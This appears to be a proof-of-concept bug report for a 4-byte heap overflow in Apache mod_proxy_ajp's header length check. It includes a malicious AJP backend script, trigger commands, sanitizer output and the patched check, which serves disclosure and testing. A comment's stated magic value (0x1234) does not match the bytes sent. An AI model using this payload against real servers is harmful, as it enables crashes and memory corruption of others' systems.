# PoC 174 — AJP Header Length Check Omits Header Bytes (mod_proxy_ajp)

`ajp_msg_check_header()` rejects only `msglen > msg->max_size`, then sets
`msg->len = msglen + AJP_HEADER_LEN`. A peer that declares
`msglen == max_size` makes the receive path write `AJP_HEADER_LEN` bytes
past the buffer, and downstream parsers trust the inflated `msg->len` for
out-of-bounds reads.

## Setup

Module: `mod_proxy_ajp`. We point a vhost at a malicious AJP backend.

`/tmp/174/httpd.conf`:

```apache
ServerRoot /tmp/174
Listen 127.0.0.1:8174
PidFile  /tmp/174/httpd.pid
ErrorLog /tmp/174/error.log
LoadModule mpm_event_module    modules/mod_mpm_event.so
LoadModule unixd_module        modules/mod_unixd.so
LoadModule authz_core_module   modules/mod_authz_core.so
LoadModule proxy_module        modules/mod_proxy.so
LoadModule proxy_ajp_module    modules/mod_proxy_ajp.so
ProxyPass / ajp://127.0.0.1:8009/
```

Default AJP `max_size` is `8192`.

### Malicious AJP backend (`/tmp/174/ajp_evil.py`)

```python
import socket
srv = socket.socket(); srv.bind(("127.0.0.1", 8009)); srv.listen(1)
c, _ = srv.accept()
# Drain the FORWARD_REQUEST so curl gets to the response phase.
_ = c.recv(65536)
# Reply: AJP magic 0x1234, declared payload length = 0x2000 (8192).
# Body: 8192 bytes whose first byte is 0x04 (CMD_AJP13_SEND_HEADERS)
# followed by garbage.
hdr  = b"\x41\x42\x20\x00"
body = b"\x04" + b"A" * 8191
c.sendall(hdr + body)
c.close()
```

`ajp_msg_check_header()` parses `msglen = 0x2000 == max_size`, accepts the
frame, and `ajp_link.c:98` then reads 8192 body bytes into
`msg->buf + 4`, writing `buf[4..8195]` into an 8192-byte allocation:
4-byte heap overflow.

## Trigger

```sh
python3 /tmp/174/ajp_evil.py &
httpd -X -f /tmp/174/httpd.conf &
curl -i http://127.0.0.1:8174/
```

## Observed effect

- The httpd worker writes 4 bytes past the end of `msg->buf`. Compiled
  with AddressSanitizer this is observed deterministically:

  ```text
  ==12345==ERROR: AddressSanitizer: heap-buffer-overflow
  WRITE of size 4 at 0x... thread T0
      #0 ap_proxy_ajp_request -> ajp_ilink_receive
         modules/proxy/ajp_link.c:98
      #1 ajp_msg_check_header
         modules/proxy/ajp_msg.c:177
  ```

- Without ASan, the overflow either silently corrupts adjacent pool
  bookkeeping (unstable later crashes) or, with the chosen body bytes,
  leaves `msg->len = 0x2004` and lets `ajp_parse_headers` /
  `ajp_parse_data` walk into uninitialized memory at
  `modules/proxy/ajp_header.c:838`, producing oops-style crashes.

- `error.log` records:

  ```text
  [proxy_ajp:error] AH00874: ajp_ilink_receive() can't receive header
  [proxy_ajp:error] AH00992: read response failed from ...
  ```

  followed by an abnormal worker termination on the affected request.

After the patch (`msglen > msg->max_size - AJP_HEADER_LEN`) the same
malicious frame is rejected at `ajp_msg.c:166` with the existing
`APLOGNO(01081)` "incoming message is too big" log line, and no write
to `msg->buf + 4` occurs.

## Cleanup

```sh
pkill -f /tmp/174/ajp_evil.py
kill $(cat /tmp/174/httpd.pid) 2>/dev/null
rm -rf /tmp/174
```
